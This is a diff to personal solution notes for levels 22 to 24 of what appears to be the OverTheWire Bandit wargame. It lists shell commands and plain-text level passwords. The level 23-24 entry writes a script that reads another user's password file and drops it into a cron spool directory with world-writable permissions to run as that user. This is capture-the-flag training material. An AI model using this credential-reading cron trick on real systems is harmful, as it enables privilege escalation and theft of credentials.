@@ -146,7 +146,22 @@ Level 21-22: -cat /etc/cron.d/cronjob_bandit22
 
 Level 22-23: -ls /etc/cron.d
 	     -cat /etc/cron.d/cronjob_bandit23
-	     -cat  /usr/bin/cronjob_bandit23.sh
-	     -/usr/bin/cronjob_bandit23.sh
-	     -cat /tmp/8169b67bd894ddbb4412f91573b38db3
-	-Password: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+	     -cat /usr/bin/cronjob_bandit23.sh
+          -echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
+	     -cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+	-Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+Level 23-24: -cd /tmp
+             -mkdir tjnaze
+             -cd tjnaze
+             -touch script.sh
+             -nano script.sh
+                    #!/bin/bash
+                    cat /etc/bandit_pass/bandit24 >> /tmp/tjnaze/password
+             -cd ..
+             -chmod 777 tjnaze
+             -cd tjnaze
+             -chmod 777 script.sh
+             -cp script.sh /var/spool/bandit24/foo/
+             -cat password
+     -Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
